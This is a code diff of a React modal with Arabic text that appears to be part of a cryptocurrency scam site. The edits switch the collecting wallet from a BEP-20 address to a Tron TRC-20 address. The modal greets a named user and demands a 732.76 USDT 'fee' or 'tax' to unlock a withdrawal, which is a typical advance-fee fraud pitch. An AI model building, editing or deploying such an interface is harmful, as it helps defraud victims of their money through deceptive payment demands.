@@ -56,13 +56,13 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ onClose }) => {
       case 3:
         return (
           <div className="space-y-4 text-right" dir="rtl">
-            <h3 className="text-xl font-bold text-[#F5A623]">عنوان محفظة BEP-20</h3>
-            <p className="text-gray-200">يرجى إدخال رابط محفظة BEP-20 الخاصة بك:</p>
+            <h3 className="text-xl font-bold text-[#F5A623]">عنوان محفظة Tron TRC 20</h3>
+            <p className="text-gray-200">يرجى إدخال رابط محفظة Tron TRC 20 الخاصة بك:</p>
             <input 
               type="text" 
               value={walletAddress}
               onChange={(e) => setWalletAddress(e.target.value)}
-              placeholder="0x..."
+              placeholder="T..."
               className="w-full bg-gray-800 border border-gray-700 text-white p-3 rounded-lg focus:outline-none focus:border-[#F5A623]"
             />
             <button 
@@ -79,13 +79,13 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ onClose }) => {
           <div className="space-y-4 text-right max-h-[70vh] overflow-y-auto pr-2" dir="rtl">
             <h3 className="text-xl font-bold text-[#F5A623]">أهلاً بك rahafmasalma</h3>
             <p className="text-gray-200 leading-relaxed text-sm">
-              بقي أمر إيداع مبلغ <span className="text-[#F5A623] font-bold">732.76 عملة USDT BEP-20</span> لفتح قناة السحب. 
+              بقي أمر إيداع مبلغ <span className="text-[#F5A623] font-bold">732.76 عملة USDT TRC 20</span> لفتح قناة السحب. 
               هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro وتم تخفيض الضريبة بتسويه من منصة mini pro بموجب اتفاق ضمن برتكول الخاص بالمنصه الاساسيه.
             </p>
             <div className="bg-gray-900 p-4 rounded-lg border border-dashed border-[#F5A623]">
               <p className="text-xs text-gray-400 mb-2">حول المبلغ إلى هذا العنوان:</p>
               <p className="text-xs font-mono break-all text-white select-all bg-black p-2 rounded">
-                0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
+                TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai
               </p>
             </div>
             <button 
@@ -115,7 +115,7 @@ const MultiStepModal: React.FC<MultiStepModalProps> = ({ onClose }) => {
 
   return (
     <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
-      {/* Backdrop - Removed pointer events to prevent accidental closure if App logic changed */}
+      {/* Backdrop */}
       <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
       
       {/* Modal Content */}
